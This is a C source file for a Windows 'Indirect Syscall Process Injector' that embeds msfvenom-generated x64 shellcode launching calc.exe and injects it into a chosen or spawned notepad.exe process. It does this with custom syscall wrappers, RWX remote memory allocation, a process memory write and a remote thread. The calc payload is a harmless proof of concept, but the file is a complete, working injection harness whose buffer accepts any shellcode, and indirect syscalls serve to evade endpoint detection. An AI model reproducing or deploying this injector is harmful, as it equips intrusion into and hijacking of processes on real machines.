#include <windows.h>
#include <stdio.h>
#include "custom_valloc.h"

// calc.exe shellcode (x64)
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char buf[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

SIZE_T bufSize = sizeof(buf);

int main(int argc, char* argv[])
{
    printf("=== Indirect Syscall Process Injector ===\n");

    // Init engine
    if (!InitSyscallEngine()) {
        printf("[-] Engine init failed\n");
        return 1;
    }

    HANDLE hProcess = NULL;
    DWORD pid = 0;
    PROCESS_INFORMATION pi = { 0 };

    if (argc >= 2) {
        // Use provided PID
        pid = (DWORD)atoi(argv[1]);
        hProcess = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
            FALSE, pid
        );
        if (!hProcess) {
            printf("[-] OpenProcess(%lu) failed: %lu\n", pid, GetLastError());
            return 1;
        }
    } else {
        // Spawn notepad as sacrificial target
        STARTUPINFOA si = { sizeof(si) };
        if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[-] Failed to spawn notepad: %lu\n", GetLastError());
            return 1;
        }
        pid = pi.dwProcessId;
        hProcess = pi.hProcess;
        Sleep(500);
        printf("[+] Spawned notepad.exe as target (PID %lu)\n", pid);
    }
    printf("[+] Target PID: %lu, Handle: %p\n\n", pid, hProcess);

    // --- Step 1: Allocate RWX in remote process ---
    printf("[*] Step 1: CustomVirtualAllocEx (RWX, %llu bytes)...\n", (unsigned long long)bufSize);
    LPVOID remoteMem = CustomVirtualAllocEx(
        hProcess, NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        printf("[-] Allocation failed\n");
        goto cleanup;
    }
    printf("[+] Remote allocation at: %p\n\n", remoteMem);

    SIZE_T bytesWritten = 0;
    printf("[*] Step 2: CustomWriteProcessMemory (%llu bytes)...\n", (unsigned long long)bufSize);
    if (!CustomWriteProcessMemory(hProcess, remoteMem, buf, bufSize, &bytesWritten)) {
        printf("[-] Write failed\n");
        goto cleanup;
    }
    printf("[+] Written %llu bytes to remote process\n\n", (unsigned long long)bytesWritten);

    // --- Step 3: Create remote thread ---
    printf("[*] Step 3: CustomCreateRemoteThread...\n");
    HANDLE hThread = CustomCreateRemoteThread(hProcess, remoteMem, NULL);
    if (!hThread) {
        printf("[-] Thread creation failed\n");
        goto cleanup;
    }
    printf("[+] Remote thread: %p\n", hThread);
    printf("[+] Shellcode executing in PID %lu — calc.exe should pop!\n", pid);

    // Wait for shellcode to finish
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

cleanup:
    if (pi.hProcess) {
        // If we spawned notepad, give calc time to appear then kill notepad
        Sleep(2000);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        CloseHandle(hProcess);
    }

    printf("\n=== Done ===\n");
    return 0;
}
